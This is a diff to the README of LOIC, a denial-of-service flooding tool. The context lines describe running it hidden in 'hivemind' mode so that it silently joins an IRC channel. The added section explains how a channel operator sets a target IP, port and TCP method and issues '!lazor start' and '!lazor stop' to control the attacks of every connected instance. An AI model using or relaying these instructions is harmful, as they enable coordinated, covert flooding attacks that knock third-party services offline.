@@ -60,3 +60,27 @@ It will connect to irc://irc.server.adress:1234/secret
 In order to do hivemind hidden run like this:
  LOIC.exe /hidden /hivemind irc.server.address
 It will connect to irc://irc.server.adress:6667/LOIC without any visible GUI
+
+==============================
+|| CONTROLING LOIC FROM IRC ||
+==============================
+
+As an OP, Admin or Owner set a channel topic or type message with (as an example):
+!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true
+
+To start attack type
+!lazor start
+
+Or just append "start" in the END of the topic
+!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true start
+
+To reset options back to default:
+!lazor default
+
+To stop attack:
+!lazor stop
+
+And remove "start" from topic (if exists)
+You can also replace "start" by "stop" in the END of the topic.
+
+Take a look at source for more details.
